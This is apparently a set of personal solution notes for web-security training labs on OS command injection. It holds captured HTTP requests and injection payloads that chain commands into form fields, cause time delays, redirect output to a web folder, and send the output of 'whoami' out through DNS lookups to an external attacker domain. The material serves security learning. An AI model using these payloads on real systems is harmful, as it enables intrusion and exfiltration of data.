# OS command injection


<details>
  <summary>Lab: OS command injection, simple case</summary>

> ###  This lab contains an OS command injection vulnerability in the product stock checker.The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

> To solve the lab, execute the ``whoami`` command to determine the name of the current user. 

---

```http
POST /product/stock HTTP/2
Host: 0ab600310469ed45802f12260076000d.web-security-academy.net
Cookie: session=7KilxApzO1M9KGCtQBlkx9sG5MambgGs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab600310469ed45802f12260076000d.web-security-academy.net/product?productId=20
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0ab600310469ed45802f12260076000d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



productId=20&storeId=1
```


```url
productId=20&storeId=1|whoami
productId=20&storeId=1;whoami
```

``output``

```css
peter-uTFecW
```



  
</details>











<details>
  <summary>Lab: Blind OS command injection with time delays</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a ``10 second`` delay. 


---


```http
POST /feedback/submit HTTP/2
Host: 0aec0019044339aa8183eed900a700bb.web-security-academy.net
Cookie: session=UpWx4wsAbuhkNEr75meJinFiJae3vxOM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: https://0aec0019044339aa8183eed900a700bb.web-security-academy.net
Referer: https://0aec0019044339aa8183eed900a700bb.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com&subject=hack&message=hello;
```




```bash
csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com||ping+-c+10+127.0.0.1||&subject=hack&message=hello;
csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com||sleep+10||&subject=hack&message=hello;
```







  
</details>





<details>
  <summary>Lab: Blind OS command injection with output redirection</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:``/var/www/images/``

> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

> To solve the lab, execute the ``whoami`` command and retrieve the output. 



---

```
POST /feedback/submit HTTP/2
Host: 0ae3008f0323db578143254500a10043.web-security-academy.net
Cookie: session=7r1pMaXUqstxBss3DmNyzzo4jwQTsXF0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: https://0ae3008f0323db578143254500a10043.web-security-academy.net
Referer: https://0ae3008f0323db578143254500a10043.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=example@admin.com&subject=c&message=d
```


```url
csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||whoami>/var/www/images/output.txt||&subject=c&message=d
```


```url
https://0ae3008f0323db578143254500a10043.web-security-academy.net/image?filename=output.txt
```

``OUtput``

```
peter-p9zLde
```



  
</details>







<details>
  <summary>Lab: Blind OS command injection with out-of-band interaction</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 


---


```
csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||nslookup crudrnshcmhythtyywai7uanxa8alegy6.oast.fun||&subject=c&message=d
```


  
</details>






<details>
  <summary>Lab: Blind OS command injection with out-of-band data exfiltration</summary>


```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

  
</details>





























